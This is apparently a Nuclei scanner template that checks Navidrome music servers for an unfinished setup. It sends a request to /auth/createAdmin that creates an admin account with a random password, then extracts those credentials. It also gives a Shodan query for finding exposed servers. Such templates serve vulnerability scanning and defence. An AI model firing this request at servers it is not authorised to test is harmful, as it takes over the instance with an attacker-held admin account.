http:
- extractors:
  - dsl:
    - '"USER: "+ username'
    - '"PASS: "+ password'
    type: dsl
  matchers:
  - part: body
    type: word
    words:
    - '"isAdmin":true'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'POST /auth/createAdmin HTTP/1.1

    Host: {{Hostname}}

    content-type: application/json

    Origin: {{RootURL}}

    Referer: {{RootURL}}/app/



    {"username":"admin","password":"{{password}}"}

    '
id: navidrome-admin-install
info:
  author: DhiyaneshDK
  metadata:
    max-request: 1
    shodan-query: html:"content="Navidrome""
    verified: true
  name: Navidrome Admin User Creation
  severity: critical
  tags: navidrome,installer,misconfig,intrusive
variables:
  password: '{{to_lower(rand_text_alpha(8))}}'
  username: admin
